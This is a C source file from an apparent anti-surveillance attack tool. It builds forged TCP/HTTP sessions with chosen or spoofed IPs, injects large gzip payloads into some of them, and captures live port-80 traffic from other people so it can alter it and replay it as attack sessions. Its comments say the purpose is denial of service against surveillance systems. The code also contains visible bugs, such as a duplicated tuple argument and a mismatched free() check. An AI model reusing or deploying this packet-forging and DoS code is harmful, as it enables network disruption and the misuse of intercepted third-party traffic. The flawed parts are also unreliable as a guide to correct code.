/*

This handles building http sessions from client, and server body.  It also has code which pulls http sessions directly off of the network for processing.
It will ensure that it is always finding new sessions to use as attacks.  It will mean that it is that much more difficult to filter, and ensures
no code updates will ever be required.

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <pthread.h>
#include <sys/time.h>
#include <ctype.h>
#include "network.h"
#include "antisurveillance.h"
#include "packetbuilding.h"
#include "utils.h"
#include "attacks.h"
#include "http.h"
#include "instructions.h"
#include <Python.h>
#include "scripting.h"
#include <http_parser.h>


char http_discovered_session_function[] = "http_session_discovered";


// wtf? string.h didnt load this..
// *** figure this out sooner or later...
char *strcasestr(char *haystack,  char *needle);


// Fabricates a fake HTTP session to inject information directly into mass surveillance platforms
// or help perform DoS attacks on their systems to disrupt their usages. This is the NEW HTTP function
// which uses the modular building routines.
int BuildHTTP4Session(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, uint32_t server_port,  char *client_body,
    int client_size, char *server_body, int server_size) {
    PacketBuildInstructions *build_list = NULL;
    ConnectionProperties cptr;
    int ret = -1;

    // these are in headers.. and seems to be +1 fromm start..
    // we need to get more requests for when they begin to *attempt* to filter these out..
    // good luck with that.
    uint32_t client_identifier = rand()%0xFFFFFFFF;
    uint32_t server_identifier = rand()%0xFFFFFFFF;

    // os emulation and general statistics required here from operating systems, etc..
    //// find correct MTU, subtract headers.. calculate.
    // this is the max size of each packet while sending the bodies...
    // *** this has to calculate out the tcp/ip headers
    // 12 is for the options.. i have to let the attack structure know if options will be built for either client or server
    int max_packet_size_client = 1500 - (20 * 2 + 12);
    int max_packet_size_server = 1500 - (20 * 2 + 12); 

    int client_port = 1024 + (rand()%(65535-1024));

    uint32_t client_seq = rand()%0xFFFFFFFF;
    uint32_t server_seq = rand()%0xFFFFFFFF;

    memset(&cptr, 0, sizeof(ConnectionProperties));
    // so we can change the seqs again later if we repeat this packet (w rebuilt source ports, identifiers and now seq)
    aptr->client_base_seq = client_seq;
    aptr->server_base_seq = server_seq;

    //OsPick(int options, int *ttl, int *window_size)
    //OsPick(OS_XP|OS_WIN7, &cptr.client_ttl, &cptr.max_packet_size_client);
    //OsPick(OS_LINUX,  &cptr.server_ttl, &cptr.max_packet_size_server);

    // if these are not set properly.. itll cause issues during low level packet building (TCPSend-ish api)
    cptr.client_ttl = 64;
    cptr.server_ttl = 53;
    cptr.max_packet_size_client = max_packet_size_client;
    cptr.max_packet_size_server = max_packet_size_server;


    cptr.server_ip = server_ip;
    cptr.server_port = server_port;
    cptr.client_ip = client_ip;
    cptr.client_port = client_port;
    gettimeofday(&cptr.ts, NULL);
    cptr.aptr = aptr;
    cptr.server_identifier = server_identifier;
    cptr.client_identifier = client_identifier;
    cptr.client_seq = client_seq;
    cptr.server_seq = server_seq;
    // deal with it later when code is completed..
    cptr.client_emulated_operating_system = 0;
    cptr.server_emulated_operating_system = 0;

    // open the connection...
    if (GenerateTCPConnectionInstructions(&cptr, &build_list) != 1) { ret = -2; goto err; }

    // now we must send data from client to server (http request)
    if (GenerateTCPSendDataInstructions(&cptr, &build_list, FROM_CLIENT, client_body, client_size) != 1) { ret = -3; goto err; }

    // now we must send data from the server to the client (web page body)
    if (GenerateTCPSendDataInstructions(&cptr, &build_list, FROM_SERVER, server_body, server_size) != 1) { ret = -4; goto err; }

    // now lets close the connection from client side first
    if (GenerateTCPCloseConnectionInstructions(&cptr, &build_list, FROM_CLIENT) != 1) { ret = -5; goto err; }

    // that concludes all packets
    aptr->packet_build_instructions = build_list;

    // now lets build the low level packets for writing to the network interface
    BuildPackets(aptr);

    // all packets done! good to go!
    ret = 1;
    err:;
    return ret;
}




// The thread has been started to perform a GZIP attack without affecting non GZIP attack packets
void *thread_gzip_attack(void *arg) {
    int i = 0;
    GZIPDetails *dptr = (GZIPDetails *)arg;
    AS_attacks *aptr = dptr->aptr;
    AS_context *ctx = dptr->ctx;

    //printf("locking id: %d %d %d\n", aptr->id, dptr->client_body_size, dptr->server_body_size);
    // lock mutex so AS_perform() leaves it alone for the time being
    pthread_mutex_lock(&aptr->pause_mutex);

    // pause this attack
    aptr->paused = 1;

    // GZIP Attack
    GZipAttack(ctx, aptr, &dptr->server_body_size, &dptr->server_body);
 
    // build session using the modified server body w gzip attacks
    i = BuildHTTP4Session(aptr, aptr->dst, aptr->src, aptr->destination_port, dptr->client_body, dptr->client_body_size, 
        dptr->server_body, dptr->server_body_size);
            
    // free the details that were passed to us
    PtrFree((char **)&dptr->server_body);
    PtrFree((char **)&dptr->client_body);
    

    // unpause the attack
    aptr->paused = 0;

    // set so AS_perform() will join.. just in case it causes leaks if you dont perform this..
    aptr->join = 1;

    // release mutex
    pthread_mutex_unlock(&aptr->pause_mutex);

    PtrFree((char **)&dptr);
    // exit this thread
    pthread_exit(NULL);
}



int GZIP_Thread(AS_context *ctx, AS_attacks *aptr, char *client_body, int client_body_size, char *server_body, int server_body_size) {
    GZIPDetails *dptr = (GZIPDetails *)calloc(1, sizeof(GZIPDetails));
    if (dptr == NULL) return 0;

    // all details the thread will need to complete its tasks
    dptr->aptr = aptr;
    dptr->ctx = ctx;
    dptr->client_body = client_body;
    dptr->client_body_size = client_body_size;
    dptr->server_body = server_body;
    dptr->server_body_size = server_body_size;

    if (pthread_create(&aptr->thread, NULL, thread_gzip_attack, (void *)dptr) == 0) {
        // if we created the thread successful, then we want to pause the thread
        aptr->paused = 1;
        
        return 1;
    }
    
    // otherwise we should free that structure we just created to pass to that new thread
    PtrFree((char **)&dptr);

    return 0;
}





// this function was created as a test during genertion of the TEST mode (define TEST at top)
// it should be removed, and handled in anoother location for final version..
// its smart to keep it separate fromm AS_session_queue() so AS_session_queue() can call this, or other functions
// to fabricate sessions of different protocols
void *HTTP4_Create(AS_attacks *aptr) {
    int i = 0;
    HTTPExtraAttackParameters *eptr = NULL;
    char *server_body = NULL, *client_body = NULL;
    int server_body_size = 0, client_body_size = 0;
    AS_context *ctx = aptr->ctx;


    // if gzip threads off.. we'd hit this code twice.. maybe use a static structure which wont need to be freed...
    if (aptr->extra_attack_parameters == NULL) {
        eptr = (HTTPExtraAttackParameters *)calloc(1, sizeof(HTTPExtraAttackParameters));
        if (eptr != NULL) {
            // parameters for gzip attack...
            // enable gzip attacks
            eptr->gzip_attack = 1;

            // percentage of sessions to perform gzip attacks on
            eptr->gzip_percentage = 10;

            // size of the gzip injection at each location it decides to insert the attack at
            eptr->gzip_size = 1024*1024 * 1;
            
            // how many injections of a GZIP attack? this is the upper range fromm 1 to this number..
            // be careful.. the amount here will exponentially increase memory usage..
            // during testing without writing to network wire.. it fills up RAM fast (waiting for pcap dumping)
            eptr->gzip_injection_rand = 5;

            // how many times to reuse the same cache before creating a new one?
            // the main variations here are between 1-100 i think.. with pthreads
            eptr->gzip_cache_count = 5000;

            // attach the extra attack parameters to this session
            aptr->extra_attack_parameters = eptr;
    
        }
    } else {
        eptr = (HTTPExtraAttackParameters *)aptr->extra_attack_parameters;
    }

    
    // verify we perform on this body
    if (eptr != NULL && eptr->gzip_attack == 1) {
        // make sure we keep it to a specific percentage
        if ((rand()%100) < eptr->gzip_percentage) {

            if (PtrDuplicate(ctx->G_server_body, ctx->G_server_body_size, &server_body, &server_body_size) &&
                PtrDuplicate(ctx->G_client_body, ctx->G_client_body_size, &client_body, &client_body_size)) {
                    // if the function paused the thread.. then we are done for now with this structure.. lets return
                    if ((GZIP_Thread(ctx, aptr, client_body, client_body_size, server_body, server_body_size) == 1) || aptr->paused) {
                        return (void *)1;
                    }
                }
        }
    }
 
    
    #ifndef BIG_TEST
        printf("client body %p size %d\nserver body %p size %d\n", ctx->G_client_body, ctx->G_client_body_size,ctx->G_server_body,
            ctx->G_server_body_size);
    #endif

    // lets try new method    
    i = BuildHTTP4Session(aptr, aptr->dst, aptr->src, aptr->destination_port, ctx->G_client_body, ctx->G_client_body_size,
        ctx->G_server_body, ctx->G_server_body_size);

    #ifndef BIG_TEST
        printf("BuildHTTPSession() = %d\n", i);
    
        printf("Packet Count: %d\n", L_count((LINK *)aptr->packets));
    #endif

    // if the thread DIDNT start (it returns immediately if it did..) then these must be freed 
    PtrFree(&client_body);
    PtrFree(&server_body);

    return NULL;
}




// pull all data from a single side of a connection in our attack list..
// this will allow you to get full http request/responses...
// I'd rather two loops here instead of using realloc()
char *ConnectionData(PacketBuildInstructions *_iptr, int side, int *_size) {
    char *ret = NULL;
    int size = 0;
    PacketBuildInstructions *iptr = _iptr;
    char *sptr = NULL;

    // lets get the size first..
    while (iptr != NULL) {
        // make sure its the correct side...
        if (((side == FROM_CLIENT) && (iptr->client == 1)) || ((side == FROM_SERVER) && (iptr->client == 0))) {
            size += iptr->data_size;
        }
        iptr = iptr->next;
    }

    if ((sptr = ret = (char *)malloc(size)) == NULL) return NULL;

    iptr = _iptr;

    // now lets copy the data..
    while (iptr != NULL) {
        // make sure its the correct side...
        if (((side == FROM_CLIENT) && (iptr->client == 1)) || ((side == FROM_SERVER) && (iptr->client == 0))) {
            memcpy(sptr, iptr->data, iptr->data_size);
            sptr += iptr->data_size;
        }
        iptr = iptr->next;
    }

    end:;
    *_size = size;
    return ret;
}



// lets do small things to change content hashes...
// also add extra zeros at the end of the file... to change hash
// TODO: ***
// take information from the connetion (src/dst ip and port) and clietn body (from cleitn side) and server body..
// and rebuild with a completely new structur so that we can do advanced modifications.
int HTTPContentModification(AS_attacks *aptr) {
    int i = 0;
    int p = 0;
    //float z = 0;
    char *tags_to_modify[] = {"<html>","<body>","<head>","<title>","</title>","</head>","</body>","</html>",NULL};
    char *sptr = NULL;
    int ret = 0;
    char magic[4] = "HTTP";
    char *response = NULL;
    int response_size = 0;
    // https://github.com/h2o/picohttpparser starting with their example...
    char *hptr = NULL;

    // work in progress
    return 0;

    // lets only perform on port 80 for now...
    if (aptr->destination_port != 80) return ret;

    // call a function which will return all data from a particular side of the TCP connection (inn this case we want to modify the server's response)
    if ((response = ConnectionData(aptr, FROM_SERVER, &response_size)) == NULL) return 0;

    // the data iis here but the library below didnt work as expected... =/
    // It might be smart to just remove it, and write some of my own code to accomplish...
    // basic http stuff shouldnt be too hard.. and if anything fails it can just discard
    // in reality, anything on the wire is probaby going to be okay to replay..
    // asa far asa securiyt concerns etc.. itll just be another session in the attack queue
    // and whats bad for us is bad for the NSA as well.

    /*
    printf("\n\n\n---------------------------\nData: %s\n---------------\n\n\n\n", response);

    hptr = strstr(response, "\r\n\r\n");

    if (hptr == NULL) goto end;

    num_headers = sizeof(headers) / sizeof(headers[0]);
    pret = phr_parse_headers(response, response_size, &headers, &num_headers, 0);


    // response now contains all of the data which was received from the server...
    // HTTP/1.1 200 etc... the entire response.. now we can modify, insert gzip attacks, etc...
    // fuck shit up essentially... every change, or modification is more stress than the NSA would like to admit
    // on their networks.

    printf("pret %d\n", pret);
    if (pret == -1) goto end;

    printf("request is %d bytes long\n", pret);
    printf("method is %.*s\n", (int)method_len, method);
    printf("path is %.*s\n", (int)path_len, path);
    printf("HTTP version is 1.%d\n", minor_version);
    printf("headers:\n");
    for (i = 0; i != num_headers; ++i) {
        printf("%.*s: %.*s\n", (int)headers[i].name_len, headers[i].name,
               (int)headers[i].value_len, headers[i].value);
    }

    //exit(-1);
*/



    /*
    // right here would knock out gzip because more than 95% wouldnt be printable.. :(
    for (i = 0; i < size; i++)
        if (isprint(data[i]))
            p++;
    
    z = (p / size) * 100;

    // probably html/text since 95% is printable character...
    if (z < 95) return 0; */

    /*for (i = 0; tags_to_modify[i] != NULL; i++) {
        if ((sptr = (char *)strcasestr(data, tags_to_modify[i])) != NULL) {
            for (z = 0; z < 3; z++) {
                p = rand()%strlen(tags_to_modify[i]);

                // at this character.. change case..
                if (isupper(sptr[p])) sptr[p] = tolower(sptr[p]);
                if (islower(sptr[p])) sptr[p] = toupper(sptr[p]);

                ret++;
            }
        }
    }*/

    end:;

    PtrFree(&response);

    return ret;
}






// This will call a python function  which is meant to generate client, and server side content
int ResearchPyDiscoveredHTTPSession(AS_context *ctx, char *IP_src, int *source_port, char *IP_dst, int *dest_port, char *Country_src, char *Country_dst, char **client_body, int *client_body_size, char **server_body, int *server_body_size) {
    int ret = 0;
    PyObject *pArgs = NULL;
    PyObject *pIP_src = NULL, *pIP_dst = NULL;
    PyObject *pCountry_src = NULL, *pCountry_dst = NULL;
    PyObject *pBodyClient = NULL, *pBodyServer = NULL;
    PyObject *pBodyClientSize = NULL, *pBodyServerSize = NULL;
    PyObject *pFunc = NULL, *pValue = NULL, *pTuple = NULL;
    AS_scripts *eptr = ctx->scripts;
    AS_scripts *sptr = ctx->scripts;
    
    char *new_client_body = NULL;
    int new_client_body_size = 0;
    char *new_server_body = NULL;
    int new_server_body_size = 0;
    char *ret_client_body = NULL;
    char *ret_server_body = NULL;

    int ret_code = 0;
    char *new_src_ip = NULL;
    char *new_dst_ip = NULL;
    int new_source_port = 0;
    int new_dest_port = 0;


    pIP_src = PyString_FromString(IP_src);
    pIP_dst = PyString_FromString(IP_dst);
    pCountry_src = PyString_FromString(Country_src);
    pCountry_dst = PyString_FromString(Country_dst);

    // if original bodies were passed then lets use them, otherwise we use a NULL byte and size of 1
    if (*client_body) {
        pBodyClient = PyString_FromStringAndSize(*client_body, *client_body_size);
        pBodyClientSize = PyInt_FromLong(*client_body_size);
    } else {
        pBodyClient = PyString_FromStringAndSize("", 1);
        pBodyClientSize = PyInt_FromLong(1);
    }
    if (*server_body) {
        pBodyServer = PyString_FromStringAndSize(*server_body, *server_body_size);
        pBodyServerSize = PyInt_FromLong(*server_body_size);
    } else {
        pBodyServer = PyString_FromStringAndSize("", 1);
        pBodyServerSize = PyInt_FromLong(1);
    }


    // prepare tuple with data for python script callback
    if ((pArgs = PyTuple_New(8)) == NULL) goto end;
    
    PyTuple_SetItem(pArgs, 0, pIP_src);
    PyTuple_SetItem(pArgs, 1, pIP_src);
    PyTuple_SetItem(pArgs, 2, pCountry_src);
    PyTuple_SetItem(pArgs, 3, pCountry_dst);
    PyTuple_SetItem(pArgs, 4, pBodyClient);
    PyTuple_SetItem(pArgs, 5, pBodyClientSize);
    PyTuple_SetItem(pArgs, 6, pBodyServer);
    PyTuple_SetItem(pArgs, 7, pBodyServerSize);

    // call all scripts looking for content_generator..
    // i need a new way to do callback, and checking for their functions.. ill redo scripting context system shortly
    // to support
    //while (sptr != NULL) {


    // find the script which has this function
    sptr = Scripting_FindFunction(ctx, http_discovered_session_function);

    if (sptr) {
        Scripting_ThreadPre(ctx, sptr);

        pFunc = PyObject_GetAttrString(sptr->pModule, http_discovered_session_function);

            // now we must verify that the function is accurate
        if (pFunc && PyCallable_Check(pFunc)) {
            // call the python function

            pValue = PyObject_CallObject(pFunc, pArgs);
        }


        if (pValue != NULL) {
            // Parse python responses for this callback
            // Tuple: (ret_code, source_ip, source port, destination ip, destination_port, client body, (automatic dont include python side)client  body size,
            // server_body, (automatic dont include)server_body size)
            // automatic is because ParseTuple "s#" will take a string, and create pointer, and size fromm it.. so on python its just the string/binary itself

            PyArg_ParseTuple(pValue, "isisis#s#", &ret_code,&new_src_ip, &new_source_port,
                &new_dst_ip, &new_dest_port, &new_client_body, &new_client_body_size, &new_server_body, &new_server_body_size);

            ret = ret_code;

            //1,2 goto end (1 = add, 2 = ignore)... 3+ (modify)
            if (ret && ret <= 2) goto end;

            // allocate memeory to hold these pointers since the returned ones are inside of python memory
            if ((ret_client_body = (char *)malloc(new_client_body_size)) == NULL) goto end;
            if ((ret_server_body = (char *)malloc(new_server_body_size)) == NULL) goto end;

            // copy the data from internal python storage into the ones for the calling function
            memcpy(ret_client_body, new_client_body, new_client_body_size);
            memcpy(ret_server_body, new_server_body, new_server_body_size);

            // free passed client body if they were even passed
            if (*client_body != NULL) free(*client_body);
            if (*client_body != NULL) free(*server_body);

            *client_body = ret_client_body;
            *client_body_size = new_client_body_size;
            *server_body = ret_server_body;
            *server_body_size = new_server_body_size;

            // so we dont free these at the end of the function  (calling function gets their pointers above)
            ret_client_body = NULL;
            ret_server_body = NULL;

            // copy the IPs over for calling function
            if (new_src_ip) *IP_src = strdup(new_src_ip);
            if (new_dst_ip) *IP_dst = strdup(new_dst_ip);

            *source_port = new_source_port;
            *dest_port = new_dest_port;


            ret = 1;
        }

        Scripting_ThreadPost(ctx, sptr);
    }

    // cleanup
    end:;
    if (pValue != NULL) Py_DECREF(pValue);
    if (pFunc != NULL) Py_DECREF(pFunc);

    //if (pArgs != NULL) Py_DECREF(pArgs);

    //if (pLanguage != NULL) Py_DECREF(pLanguage);
    //if (pSiteCategory != NULL) Py_DECREF(pSiteCategory);
    //if (pSiteID != NULL) Py_DECREF(pSiteID);
    if (pBodyServerSize != NULL) Py_DECREF(pBodyServerSize);
    if (pBodyClientSize != NULL) Py_DECREF(pBodyClientSize);
    if (pBodyServer != NULL) Py_DECREF(pBodyServer);
    if (pBodyClient != NULL) Py_DECREF(pBodyClient);
    if (pCountry_dst != NULL) Py_DECREF(pCountry_dst);
    if (pCountry_src != NULL) Py_DECREF(pCountry_src);
    if (pIP_dst != NULL) Py_DECREF(pIP_dst);
    if (pIP_src != NULL) Py_DECREF(pIP_src);
    

    if (ret_client_body != NULL) free(ret_client_body);
    if (ret_server_body != NULL) free(ret_server_body);

    return ret;
}







// Initializes the HTTP Discovery subsystem, and implements the network filter, and hook for ensuring we receive WWW packets
int HTTPDiscover_Init(AS_context *ctx) {
    FilterInformation *flt = NULL;
    int ret = 0;

    // allocate space for our incoming packet filter
    if ((flt = (FilterInformation *)calloc(1, sizeof(FilterInformation))) == NULL) goto end;

    // create a filter for port 80
    FilterPrepare(flt, FILTER_PACKET_TCP|FILTER_SERVER_PORT|FILTER_PACKET_FAMILIAR, 80);

    // append it into the network hooking subsystem
    if (Network_AddHook(ctx, flt, &HTTPDiscover_Incoming) != 1) goto end;

    // now we will begin getting raw http sessions to automate into mass surveillancce attacks :)

    end:;
    return ret;

}

static int pcount = 0;

// Look for new connections via SYN packets, and completed ones via FIN/RST packets.
// Once both are found then it is considered a complete single HTTP session, and can be used as an attack itself.
// It will allow constant real world traffic being integrated directly into the attack platform.
int HTTPDiscover_Incoming(AS_context *ctx, PacketBuildInstructions *iptr) {
    int ret = -1;
    HTTPBuffer *hptr = ctx->http_buffer_list;
    char fname[32];
    PacketBuildInstructions *packet_copy = NULL;
    //sprintf(fname, "packets/data_%d.dat", pcount);
    //FileWrite(fname, iptr->data, iptr->data_size);

    //sprintf(fname, "packets/raw_%d.dat", pcount++);
    //FileWrite(fname, iptr->packet, iptr->packet_size);

    // if its not enabled.. just exit
    if (!ctx->http_discovery_enabled) return 0;
    
    while (hptr != NULL) {
        // find connecction by source ports...
        // if it matches another (unlikely) fuck it. who cares. it wont get far.
        if (((hptr->source_port == iptr->source_port) && (hptr->destination_port == iptr->destination_port)) ||
        ((hptr->source_port == iptr->destination_port) && (hptr->destination_port == iptr->source_port)))
            break;

        hptr = hptr->next;
    }

    // we are not currently monitoring this http session...is it a SYN? (new connection)
    if (hptr == NULL) {
        // look for SYN packet (start of connection)
        if ((iptr->flags & TCP_FLAG_SYN) && iptr->ack == 0) {
            // it is a SYN packet.. start of a connection.. we need to begin to monitor
            if ((hptr = (HTTPBuffer *)calloc(1, sizeof(HTTPBuffer))) == NULL) goto end;
            
            hptr->source_ip = iptr->source_ip;
            hptr->destination_ip = iptr->destination_ip;

            hptr->source_port = iptr->source_port;
            hptr->destination_port = iptr->destination_port;

            CopyIPv6Address(&hptr->source_ipv6, &iptr->source_ipv6);
            CopyIPv6Address(&hptr->destination_ipv6, &iptr->destination_ipv6);

            hptr->size = iptr->packet_size;

            //L_link_ordered((LINK **)&ctx->http_buffer_list, (LINK *)hptr);
            hptr->next = ctx->http_buffer_list;
            ctx->http_buffer_list = hptr;

            // return ret 1 since we will use iptr
            ret = 1;
        }
    } else {
        // is this the  client, or  server packet?        
        iptr->client = (iptr->source_port == hptr->source_port);

        hptr->size += iptr->packet_size;

        // look for FIN packet (end of connection)
        if ((iptr->flags & TCP_FLAG_FIN)) {
            // the connectioon should be closed... so we can assume the data is complete..
            // mark it for the other functions to know...
            hptr->complete = 1;
        }

        // return ret 1 since we will use iptr
        ret  = 1;
    }


    // we wanna duplicate the instructions so that the network subsystem can continue to send to other modules afterwards
    if (ret == 1) {
        if ((packet_copy = InstructionsDuplicate(iptr)) != NULL) {
            // we copied the next (which should be  NULL but just in case something else in future  gives us iptr)
            packet_copy->next = NULL;
            // link to our http buffer structure
            L_link_ordered((LINK **)&hptr->packet_list, (LINK *)packet_copy);
        }
    }

    end:;

    return ret;
}


    
// This will have access to the full http connection... (using ConnectionData to filter out each side)
int HTTPDiscover_AnalyzeSession(AS_context *ctx, HTTPBuffer *hptr) {
    int ret = 0, i = 0;
    char *server_body = NULL;
    int server_body_size = 0;
    char *client_body = NULL;
    int client_body_size = 0;

    char *source_ip = NULL;
    char *new_source_ip = NULL;
    int source_country = 0;
    
    char *destination_ip = NULL;
    char *new_destination_ip = NULL;
    int destination_country = 0;

    int new_dest_port = hptr->destination_port;
    int new_source_port = hptr->source_port;

    int is_src_ipv6 = 0;
    int is_dest_ipv6 = 0;
    AS_attacks *aptr = NULL;
    PacketBuildInstructions *iptr = NULL;
    PacketBuildInstructions *build_list = NULL;
    ConnectionProperties cptr;
    

    // these are in headers.. and seems to be +1 fromm start..
    // we need to get more requests for when they begin to *attempt* to filter these out..
    // good luck with that.
    uint32_t client_identifier = rand()%0xFFFFFFFF;
    uint32_t server_identifier = rand()%0xFFFFFFFF;

    // os emulation and general statistics required here from operating systems, etc..
    //// find correct MTU, subtract headers.. calculate.
    // this is the max size of each packet while sending the bodies...
    // *** this has to calculate out the tcp/ip headers
    // 12 is for the options.. i have to let the attack structure know if options will be built for either client or server
    int max_packet_size_client = 1500 - (20 * 2 + 12);
    int max_packet_size_server = 1500 - (20 * 2 + 12); 

    int client_port = 1024 + (rand()%(65535-1024));

    uint32_t client_seq = rand()%0xFFFFFFFF;
    uint32_t server_seq = rand()%0xFFFFFFFF;

    if (hptr->size == 0) goto end;

    memset(&cptr, 0, sizeof(ConnectionProperties));

    // get cient side of http connection..
    // cookies, URL, user agent, etc
    //client_body = ConnectionData(hptr->packet_list, FROM_CLIENT, &client_body_size);
    //FileWrite("client.dat", client_body, client_body_size);
    // get server side of http connection (http response, cookies, etc) 
    //server_body = ConnectionData(hptr->packet_list, FROM_SERVER, &server_body_size);
    //FileWrite("server.dat", server_body, server_body_size);

    // at this point we have both bodies... we can pass to python callback to pull out server_name, and other heqader information
    // or attempt in C.. ill try to support both.. i dont think ill get too far into it.. its not reallly required atm
    // pulling hostname, and url from client side to at least support GET is good enough
    // python can be used as a calllback fro grabbing post infformation
    //printf("\n\n\nHTTP SESSION DISCOVERED: client size %d server size %d\n\n\n\n", client_body_size, server_body_size);

    source_ip = IP_prepare_ascii(&hptr->source_ip, &hptr->source_ipv6);
    destination_ip = IP_prepare_ascii(&hptr->destination_ip, &hptr->destination_ipv6);

    new_source_ip = source_ip;
    new_destination_ip = destination_ip;

    i = 1;
    //i  = ResearchPyDiscoveredHTTPSession(ctx, &new_source_ip, &new_source_port, &new_destination_ip, &new_dest_port, &source_country, &destination_country, &client_body, &client_body_size, &server_body, &server_body_size);

    if (i == 0) goto end;

    // what to do with this http session?
    if (i == 1) {
        // add as is...
        // fall through....
    } else if (i == 2) {
        // ignoroe commpletely...
        goto end;
    } else if (i == 3) {
        // we wanna modify parameters, and then add
        if (new_source_ip != source_ip) {
            free(source_ip);
            source_ip = NULL;
            IP_prepare(new_source_ip, &hptr->source_ip, &hptr->source_ipv6, &is_src_ipv6);
        }

        if (new_destination_ip != destination_ip) {
            free(destination_ip);
            destination_ip = NULL;
            IP_prepare(new_destination_ip, &hptr->destination_ip, &hptr->destination_ipv6, &is_dest_ipv6);
        }

        hptr->source_port = new_source_port;
        hptr->destination_port = new_dest_port;

        // gotta change what we gotta change.
        iptr = hptr->packet_list;
        while (iptr != NULL) {
            // is this client side?
            if (iptr->client) {
                iptr->source_ip = hptr->source_ip;
                iptr->destination_ip = hptr->destination_ip;
                CopyIPv6Address(&iptr->source_ipv6, &hptr->source_ipv6);
                CopyIPv6Address(&iptr->destination_ipv6, &hptr->destination_ipv6);

                iptr->source_port = hptr->source_port;
                iptr->destination_port = hptr->destination_port;
            } else {
                // or server side?
                iptr->destination_ip = hptr->source_ip;
                iptr->source_ip = hptr->destination_ip;
                CopyIPv6Address(&iptr->destination_ipv6, &hptr->source_ipv6);
                CopyIPv6Address(&iptr->source_ipv6, &hptr->destination_ipv6);

                iptr->destination_port = hptr->source_port;
                iptr->source_port = hptr->destination_port;
            }
            
            iptr = iptr->next;
        }
    }


    if ((aptr = InstructionsToAttack(ctx, hptr->packet_list, 9999999, 1)) == NULL) goto end;
    

    // so we can change the seqs again later if we repeat this packet (w rebuilt source ports, identifiers and now seq)
    aptr->client_base_seq = client_seq;
    aptr->server_base_seq = server_seq;

    //OsPick(int options, int *ttl, int *window_size)
    //OsPick(OS_XP|OS_WIN7, &cptr.client_ttl, &cptr.max_packet_size_client);
    //OsPick(OS_LINUX,  &cptr.server_ttl, &cptr.max_packet_size_server);

    // if these are not set properly.. itll cause issues during low level packet building (TCPSend-ish api)

    // lets grab ttl from the connection..
    cptr.client_ttl = hptr->packet_list->ttl;
    cptr.server_ttl = hptr->packet_list->next->ttl;

    // double check these and get fromm connection
    cptr.max_packet_size_client = max_packet_size_client;
    cptr.max_packet_size_server = max_packet_size_server;

    printf("source ip %s dest ip  %s\n", new_source_ip, new_destination_ip );
    
    IP_prepare(new_source_ip, &cptr.client_ip, &cptr.client_ipv6, &is_src_ipv6);
    IP_prepare(new_destination_ip, &cptr.server_ip, &cptr.server_ipv6, &is_dest_ipv6);

    //cptr.server_ip = hptr->destination_ip;
    //cptr.client_ip = hptr->source_port;

    
    //CopyIPv6Address(&cptr.client_ipv6, &hptr->source_ipv6);
    //CopyIPv6Address(&cptr.server_ipv6, &hptr->destination_ipv6);

    cptr.client_port = hptr->destination_port;
    cptr.server_port = hptr->source_port;

    gettimeofday(&cptr.ts, NULL);
    cptr.aptr = aptr;
    cptr.server_identifier = server_identifier;
    cptr.client_identifier = client_identifier;
    cptr.client_seq = client_seq;
    cptr.server_seq = server_seq;
    // deal with it later when code is completed..
    cptr.client_emulated_operating_system = 0;
    cptr.server_emulated_operating_system = 0;

    // open the connection...
    if (GenerateTCPConnectionInstructions(&cptr, &build_list) != 1) { ret = -2; goto err; }

    // now we must send data from client to server (http request)
    if (GenerateTCPSendDataInstructions(&cptr, &build_list, FROM_CLIENT, client_body, client_body_size) != 1) { ret = -3; goto err; }

    // now we must send data from the server to the client (web page body)
    if (GenerateTCPSendDataInstructions(&cptr, &build_list, FROM_SERVER, server_body, server_body_size) != 1) { ret = -4; goto err; }

    // now lets close the connection from client side first
    if (GenerateTCPCloseConnectionInstructions(&cptr, &build_list, FROM_CLIENT) != 1) { ret = -5; goto err; }

    // that concludes all packets
    aptr->packet_build_instructions = build_list;

    // lets set as live source..
    // or we need to use some kinda callbacks like traceroutee queu for 75% completion
    aptr->live_source = 1;

    // now lets build the low level packets for writing to the network interface
    BuildPackets(aptr);    

    // add to main attack list
    aptr->next = ctx->attack_list;
    ctx->attack_list = aptr;


    ret = 1;
    end:;
    err:;
    hptr->processed = 1;

    if (client_body != NULL) free(client_body);
    if (server_body != NULL) free(server_body);
    if (source_ip != NULL) free(source_ip);
    if (destination_ip != NULL) free(destination_ip);

    if (new_destination_ip != destination_ip)
        if (new_destination_ip != NULL) free(new_destination_ip);

    if (new_source_ip != source_ip)
        if (new_source_ip != NULL) free(new_source_ip);

    return ret;
}





// perform function (regular looop)..
// this needs to check if any of our internal buffers have a full HTTP session, timed out, or used too much  buffer and needs to be discarded
int HTTPDiscover_Perform(AS_context *ctx) {
    int ret = 0;
    HTTPBuffer *hptr = ctx->http_buffer_list;
    int ts = time(0);

    // loop and analyze any completed sessions we found in live traffic
    while (hptr != NULL) {
        if (!hptr->processed && hptr->complete) {
            ret += HTTPDiscover_AnalyzeSession(ctx, hptr);
        }

        if (!hptr->complete) {
            // is it over the buffer? (1meg)
            if (hptr->size >= HTTP_BUFFER) {
                // mark for deletion
                hptr->processed=1;
            }

        }

        // we give a maximum of this timmeout  (currently 10 seconds) for a complete http session to buffer
        if ((ts - hptr->ts) > HTTP_DISCOVER_TIMEOUT) hptr->processed = 1;

        hptr = hptr->next;

    }

    ret += HTTPDiscover_Cleanup(ctx);

    end:;
    return ret;
}




// cleans up anything thats completely processed..
int HTTPDiscover_Cleanup(AS_context *ctx) {
    int ret = 0;
    HTTPBuffer *hptr = ctx->http_buffer_list;
    HTTPBuffer *hlast = NULL, *hnext = NULL;

    while (hptr != NULL) {
        // processed means it donne
        if (hptr->processed) {
            if (hlast == NULL)
                ctx->http_buffer_list = hptr->next;
            else
                hlast->next = hptr->next;

            hnext = hptr->next;

            PacketBuildInstructionsFree(&hptr->packet_list);

            free(hptr);

            hptr = hnext;

            continue;

        }

        hlast = hptr;
        hptr = hptr->next;
    }

    end:;
    return ret;
}